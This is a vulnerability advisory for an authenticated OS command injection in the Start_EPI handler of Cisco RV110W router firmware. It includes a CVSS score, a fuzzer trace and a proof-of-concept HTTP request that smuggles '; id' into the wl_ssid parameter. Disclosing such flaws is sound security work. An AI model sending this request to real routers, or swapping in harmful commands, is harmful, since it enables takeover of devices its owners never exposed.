## Cisco RV110W Start_EPI command injection

### Title

```
Cisco RV110W Start_EPI OS Command Injection via wl_ssid
```

### Vendor / Product / Version

```
Cisco Systems / RV110W Wireless-N VPN Firewall / Firmware <= 1.2.1.7
```

### Component

```
/usr/sbin/httpd — Start_EPI handler (0x46a838)
```

### Vulnerability Type

```
CWE-78: OS Command Injection
```

### CVSS 3.1

```
8.8 (High) CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```

### Description

```
An OS command injection vulnerability exists in the Start_EPI function
(address 0x46a838) of the httpd binary in Cisco RV110W firmware <= 1.2.1.7.

The function reads the wl_ssid parameter via get_cgi(), formats it into
"wl join <wl_ssid>" via sprintf(), and passes it to system() without
sanitization. An authenticated attacker can inject arbitrary commands.

Verification: Unicorn Fuzzer CONFIRMED at iteration 0. Payload "; id"
(hex: 3b206964) reached system() producing command "wl join ; id".
Execution path: 0x46a838 → 0x41a534 (get_cgi x6) → 0x500310 (system).
```

### Proof of Concept

```http
POST /apply.cgi HTTP/1.1
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded
Cookie: <valid_session>

submit_button=EPI&change_action=gozila_cgi&submit_type=Start_EPI&wl_ssid=;id&wl_ant=0&wl_rate=auto&ttcp_num=1&ttcp_ip=192.168.1.1&ttcp_size=1500
```

### Affected Parameters

```
wl_ssid (primary), wl_ant, wl_rate, ttcp_num, ttcp_ip, ttcp_size
```

### Unicorn Fuzzer Evidence

```json
{
  "target_id": "cisco@@RV110W@@Start_EPI@@0x46a838",
  "crash_type": "command_injection",
  "severity": "confirmed",
  "sink_func": "system",
  "payload_hex": "3b206964",
  "details": "wl join ; id",
  "path_blocks": ["0x46a838","0x50011c","0x46a888","0x46a8c8","0x41a534",
    "0x46a8dc","0x41a534","0x46a8f8","0x41a534","0x46a914","0x41a534",
    "0x46a930","0x46a93c","0x41a534","0x46a950","0x41a534","0x46a96c",
    "0x46a978","0x46a980","0x50010c","0x46a998","0x500160","0x46a9b8",
    "0x46aa04","0x500310"]
}
```

### Credit

```
Discovered by ST4R using FirmRec automated symbolic execution engine.
```

